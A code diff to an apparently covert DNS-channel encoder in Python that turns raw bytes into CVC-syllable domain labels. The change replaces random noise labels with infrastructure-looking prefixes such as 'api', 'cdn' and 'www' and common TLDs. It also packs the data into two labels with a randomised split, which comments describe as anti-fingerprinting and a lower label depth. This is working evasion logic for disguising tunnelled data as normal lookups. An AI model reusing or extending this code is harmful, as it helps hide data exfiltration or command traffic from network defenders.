@@ -6,26 +6,20 @@ C_START = ['b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'r', 's',
 VOWELS = ['a', 'e', 'i', 'o', 'u', 'y']
 C_END = ['b', 'c', 'd', 'f', 'g', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'x', 'z']
 
-# --- Noise generation for anti-fingerprinting ---
-# All noise labels are 2-char: guaranteed non-CVC (CVC requires exactly 3 chars)
-# The decoder identifies data purely by CVC pattern matching — no delimiters needed
-NOISE_TLDS = ['eu', 'io', 'us', 'uk', 'az', 'co', 'to', 'me']
+# --- Domain construction ---
+# Infrastructure keywords as subdomain prefix (none are valid CVC patterns)
+# Safe because: 'api'/'cdn'/'www'/'auth' fail CVC vowel check,
+# 'assets'/'static'/'images' are 6 chars with non-CVC triplets
+INFRA_KEYWORDS = ['api', 'cdn', 'assets', 'static', 'images', 'auth', 'www']
+
+# TLDs that are NOT valid CVC patterns (2-char or fail CVC check)
+SAFE_TLDS = ['io', 'co', 'uk', 'us', 'eu', 'dev', 'app', 'org']
 
 # Safety net: words to skip during decoding (all are non-CVC patterns)
 IGNORE_WORDS = {
-    'org', 'io', 'eu', 'us', 'uk', 'az', 'co', 'to', 'me',
-    'www', 'ftp', 'ns1', 'ns2', 'mail', 'smtp', 'api', 'cdn', 'dns',
+    'org', 'io', 'eu', 'us', 'uk', 'co', 'dev', 'app',
+    'api', 'cdn', 'assets', 'static', 'images', 'auth', 'www',
 }
-
-def _random_noise_label():
-    """Generate a random 2-char DNS label that can never be a valid CVC syllable."""
-    strategies = [
-        lambda: random.choice('aeiou') + random.choice('0123456789'),          # 'a7', 'e3'
-        lambda: random.choice('aeiou') + random.choice('bcdfghklmnprstvwxz'),   # 'ap', 'ek'
-        lambda: random.choice('bcdfghklmnprstvwxz') + random.choice('0123456789'), # 'k3', 'n7'
-        lambda: random.choice('aeiou') + random.choice('aeiou'),                # 'ai', 'ou'
-    ]
-    return random.choice(strategies)()
 
 def _value_to_syllable(value_10bit):
     """Internal: Convert 10-bit integer to CVC syllable"""
@@ -63,32 +57,27 @@ def encode_bytes_to_domain(raw_data: bytes) -> str:
         
     cvc_list.reverse()
     
-    labels = []
-    current_group = ""
-    for i, cvc in enumerate(cvc_list):
-        current_group += cvc
-        if (i + 1) % 4 == 0:
-            labels.append(current_group)
-            current_group = ""
-    if current_group:
-        labels.append(current_group)
-        
-    domain_core = ".".join(labels)
+    # --- Pack all CVC syllables into exactly 2 data labels ---
+    # Target: {keyword}.{data1}.{data2}.{tld} = 4 labels (depth ~3.3)
+    all_cvc = "".join(cvc_list)
+    total_syls = len(cvc_list)
     
-    # Generate random noise labels (all 2-char, never match CVC)
-    num_prefix = random.randint(1, 3)
-    num_suffix = random.randint(0, 1)
-    prefix_labels = [_random_noise_label() for _ in range(num_prefix)]
-    suffix_labels = [_random_noise_label() for _ in range(num_suffix)]
-    tld = random.choice(NOISE_TLDS)
+    if total_syls <= 2:
+        # Very small payload: single data label
+        data_labels = [all_cvc]
+    else:
+        # Variable split point for length variance (anti-fingerprinting)
+        mid = total_syls // 2
+        lo = max(1, mid - 2)
+        hi = min(total_syls - 1, mid + 2)
+        split_syl = random.randint(lo, hi)
+        split_char = split_syl * 3
+        data_labels = [all_cvc[:split_char], all_cvc[split_char:]]
     
-    all_parts = prefix_labels + labels + suffix_labels + [tld]
-    domain_name = ".".join(all_parts)
-
-    # Debug: log long domains
-    if len(labels) > 8:
-        print(f"[ENCODE DEBUG] {len(raw_data)} bytes -> {len(cvc_list)} syllables -> {len(labels)} labels")
-        print(f"[ENCODE DEBUG] domain: {domain_name}")
+    keyword = random.choice(INFRA_KEYWORDS)
+    tld = random.choice(SAFE_TLDS)
+    parts = [keyword] + data_labels + [tld]
+    domain_name = ".".join(parts)
 
     return domain_name
 
